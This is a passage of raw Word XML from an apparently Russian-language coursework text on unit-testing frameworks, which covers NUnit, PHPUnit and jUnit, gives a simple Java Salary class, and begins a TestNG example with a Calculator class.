          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"># разработчики создали </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>NUnit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:p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4) </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Perl</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> скрипты можно тестировать с помощью </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Test</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>::</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Unit</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:p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5) </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>PHP</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> код могут тестировать с помощью </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>PHPUnit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> модуля.</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proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>jUnit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> применяется для модульного тестирования, которое позволяет проверять на правильность отдельные модули исходного кода программы. Преимущество данного подхода заключается в изолировании отдельно взятого модуля от других. При этом, цель такого метода позволяет программисту удостовериться, что модуль, сам по себе, способен работать корректно. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>jUnit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> представляет из себя библиотеку классов. Для демонстрации основных возможностей этой библиотеки, можно написать примитивный класс:</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public</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> class Salary { </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private</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> value; </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private</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> String type; </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>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 </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public</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Salary(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> v, String t){ </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value</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> = v; </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type</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> = t; </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 </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public</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Salary add(Salary s){ </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return</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> new Salary(value + </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>s.getValue</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(), type); </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lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">} </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t>public</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>getValue</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(){ </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lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>return</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> value; </w:t>
      </w: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 </w:t>
      </w:r>
    </w:p>
    <w:p w:rsid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w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005E2C4B" w:rsidRDefault="005E2C4B" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="708"/>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2.4 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>TestNG</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="005E2C4B" w:rsidRDefault="005E2C4B" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve">В качестве </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>обьяснения</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> приведу пример работы:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0"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Простейший тест.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0"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До того, как мы начнем, давайте подумаем над тем, а что же собственно мы будем проверять? Предлагается далеко не ходить и написать небольшой класс, который будет в конструкторе получать 2 числа и будет иметь метод </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>getResult</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>) , возвращающий нам произведение этих 2-х чисел. Простенько и со вкусом.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0"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Код будет выглядеть примерно вот так:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>public</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> class Calculator {</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    private </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> first;</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    private </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
